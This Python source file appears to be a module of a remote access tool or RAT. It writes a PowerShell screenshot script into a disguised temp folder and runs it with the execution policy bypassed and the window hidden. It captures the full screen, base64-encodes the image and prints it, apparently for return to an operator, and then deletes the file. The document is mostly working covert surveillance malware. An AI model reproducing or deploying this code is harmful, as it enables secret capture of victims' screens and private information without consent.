# -*- coding: utf-8 -*-
__author__ = "Marten4n6 , Siddhant385"
__license__ = "GPLv3"

import subprocess
import os
import os.path
from base64 import b64encode


#------------------_
#VARIABLES FOR SCREEN STORATION
FOLDER_NAME = "TEMP2343432"
FOLDER_PATH = os.getenv("temp") +f"\\{FOLDER_NAME}"
SCREENSHOT_SCRIPT_PATH = FOLDER_PATH + "\\save-screenshot.ps1"
#-------------------



#------------------
#This script is take from https://github.com/fleschutz/PowerShell
# Author of the script is Markus Fleschutz
SCREENSHOT_SCRIPT = """
<#
.SYNOPSIS
	Saves a single screenshot
.DESCRIPTION
	This PowerShell script takes a single screenshot and saves it into a target folder (default is the user's screenshots folder).
.PARAMETER TargetFolder
	Specifies the target folder (the user's screenshots folder by default)
.EXAMPLE
	PS> ./save-screenshot
 	✔️ screenshot saved to C:\Users\Markus\Pictures\Screenshots\2021-10-10T14-33-22.png
.LINK
	https://github.com/fleschutz/PowerShell
.NOTES
	Author: Markus Fleschutz | License: CC0
#>

param([string]$TargetFolder = "")

function GetScreenshotsFolder {
        if ($IsLinux) {
                $Path = "$HOME/Pictures"
                if (-not(Test-Path "$Path" -pathType container)) { throw "Pictures folder at $Path doesn't exist (yet)"}
                if (Test-Path "$Path/Screenshots" -pathType container) { $Path = "$Path/Screenshots" }
        } else {
                $Path = [Environment]::GetFolderPath('MyPictures')
                if (-not(Test-Path "$Path" -pathType container)) { throw "Pictures folder at $Path doesn't exist (yet)" }
                if (Test-Path "$Path\Screenshots" -pathType container) { $Path = "$Path\Screenshots" }
        }
        return $Path
}

function TakeScreenshot { param([string]$FilePath)
	Add-Type -Assembly System.Windows.Forms            
	$ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
	$ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
	$DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
	$DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
	$DrawingGraphics.Dispose()
	$ScreenshotObject.Save($FilePath)
	$ScreenshotObject.Dispose()
}

try {
	if ("$TargetFolder" -eq "") { $TargetFolder = {folderpath} }
	$Time = (Get-Date)
	$Filename = "screenshot.png"
	$FilePath = (Join-Path $TargetFolder $Filename)
	TakeScreenshot $FilePath

	"✔️ screenshot saved to $FilePath"
	exit 0 # success
} catch {
	"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
	exit 1
}

""".format(folderpath=FOLDER_PATH)



def run_command(command):
    out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    return out + err


def screenshottaker():
    #Checks if folder exists or not if not exists creates one
    if not os.path.exists(os.path.expandvars(FOLDER_PATH)):
        os.makedirs(FOLDER_PATH)
    #Checks if script is present or not if not present creates the script
    if not os.path.exists(os.path.expandvars(SCREENSHOT_SCRIPT_PATH)):
        f = open(os.path.expandvars(SCREENSHOT_SCRIPT_PATH), 'w')
        f.write(SCREENSHOT_SCRIPT)
        f.close()
    #Get the screenshot
    command = f"powershell -ep Bypass -windowstyle hidden .\{SCREENSHOT_SCRIPT_PATH} save-screenshot"
    run_command(command)
    if os.path.exists(os.path.expandvars(FOLDER_PATH+"\\screenshot.png")):
        return True
    else:
        return False
    


def run(options):
    if screenshottaker():
        with open(FOLDER_PATH+"\\screenshot.png",'rb') as f:
            data = f.read()
            f.close()
        raw_data = b64encode(data)

        print(raw_data)
        run_command("rm -rf " + FOLDER_PATH+"\\screenshot.png")
    else:
        print("No Screenshot file found")
